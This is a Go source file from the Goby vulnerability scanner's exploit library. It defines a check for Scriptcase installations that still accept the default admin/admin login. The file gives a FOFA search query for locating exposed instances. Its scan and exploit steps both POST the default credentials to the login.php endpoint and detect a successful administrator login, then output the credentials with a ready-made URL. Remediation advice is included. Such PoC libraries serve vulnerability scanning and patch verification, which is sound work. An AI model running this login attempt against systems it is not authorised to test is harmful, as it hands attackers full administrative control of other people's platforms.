package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "scriptcase login.php default-password vulnerability",
    "Description": "<p>Scriptcase is a powerful tool for generating Web systems and business applications.It also helps you create complete reports (with dashboards, charts, and Pivottables) for management data analytics (business intelligence) in a simple and quick way.</p><p></p><p>Default password vulnerability exists in Scriptcase, attackers can control the whole platform with default password admin/admin and operate core functions with administrator rights.</p>",
    "Product": "Scriptcase",
    "Homepage": "https://fofa.so/",
    "DisclosureDate": "2022-07-23",
    "Author": "橘先生",
    "FofaQuery": "title=\"ScriptCase\" && body=\"登录\"",
    "GobyQuery": "title=\"ScriptCase\" && body=\"登录\"",
    "Level": "1",
    "Impact": "<p>Default password vulnerability exists in Scriptcase, attackers can control the whole platform with default password admin/admin and operate core functions with administrator rights.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/scriptcase/devel/iface/login.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
                },
                "data_type": "text",
                "data": "ajax=nm&option=login&field_user=admin&field_pass=admin&form_login=1&language=zh_CN&keep_logged=true"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "group",
                        "operation": "OR",
                        "checks": [
                            {
                                "type": "item",
                                "variable": "$body",
                                "operation": "contains",
                                "value": "__#@#__",
                                "bz": ""
                            },
                            {
                                "type": "group",
                                "operation": "AND",
                                "checks": [
                                    {
                                        "type": "item",
                                        "variable": "$body",
                                        "operation": "contains",
                                        "value": "Disconnect this user",
                                        "bz": ""
                                    },
                                    {
                                        "type": "item",
                                        "variable": "$body",
                                        "operation": "contains",
                                        "value": "error1:user_connected",
                                        "bz": ""
                                    }
                                ]
                            }
                        ]
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/scriptcase/devel/iface/login.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
                },
                "data_type": "text",
                "data": "ajax=nm&option=login&field_user=admin&field_pass=admin&form_login=1&language=zh_CN&keep_logged=true"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "group",
                        "operation": "OR",
                        "checks": [
                            {
                                "type": "item",
                                "variable": "$body",
                                "operation": "contains",
                                "value": "__#@#__",
                                "bz": ""
                            },
                            {
                                "type": "group",
                                "operation": "AND",
                                "checks": [
                                    {
                                        "type": "item",
                                        "variable": "$body",
                                        "operation": "contains",
                                        "value": "Disconnect this user",
                                        "bz": ""
                                    },
                                    {
                                        "type": "item",
                                        "variable": "$body",
                                        "operation": "contains",
                                        "value": "error1:user_connected",
                                        "bz": ""
                                    }
                                ]
                            }
                        ]
                    }
                ]
            },
            "SetVariable": [
                "keymemo|define|variable|admin:admin",
                "vulurl|define|variable|{{{scheme}}}://admin:admin@{{{hostinfo}}}/scriptcase/devel/iface/login.php",
                "output|define|variable|{{{keymemo}}}"
            ]
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "7",
    "Translation": {
        "CN": {
            "Name": "scriptcase login.php 默认口令漏洞",
            "Product": "Scriptcase",
            "Description": "<p><span style=\"color: rgb(41, 43, 44);\">Scriptcase是用于生成Web系统和业务应用程序的强大工具。它还可以帮助您以</span><span style=\"color: rgb(41, 43, 44);\">简单快捷的方式为管理数据分析</span><span style=\"color: rgb(41, 43, 44);\">（商业智能</span><span style=\"color: rgb(41, 43, 44);\">）创建完整的报告（带有仪表板，图表和数据透视表）.</span><br></p><p><span style=\"color: rgb(41, 43, 44);\"><span style=\"color: rgb(41, 43, 44);\">Scriptcase存在默认口令漏洞,攻击者使用默认口</span>令 admin/adm<span style=\"color: rgb(41, 43, 44);\">in 即可控制整个平台，使用管理员权限操作核心的功能。</span></span></p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p><span style=\"color: rgb(41, 43, 44); font-size: 16px;\">Scriptcase存在默认口令漏洞,攻击者使用默认口</span><span style=\"color: rgb(41, 43, 44); font-size: 16px;\">令 admin/adm</span><span style=\"color: rgb(41, 43, 44); font-size: 16px;\">in 即可控制整个平台，使用管理员权限操作核心的功能。</span><br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "scriptcase login.php default-password vulnerability",
            "Product": "Scriptcase",
            "Description": "<p>Scriptcase is a powerful tool for generating Web systems and business applications.It also helps you create complete reports (with dashboards, charts, and Pivottables) for management data analytics (business intelligence) in a simple and quick way.</p><p></p><p>Default password vulnerability exists in Scriptcase, attackers can control the whole platform with default password admin/admin and operate core functions with administrator rights.</p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>Default password vulnerability exists in Scriptcase, attackers can control the whole platform with default password admin/admin and operate core functions with administrator rights.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10694"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}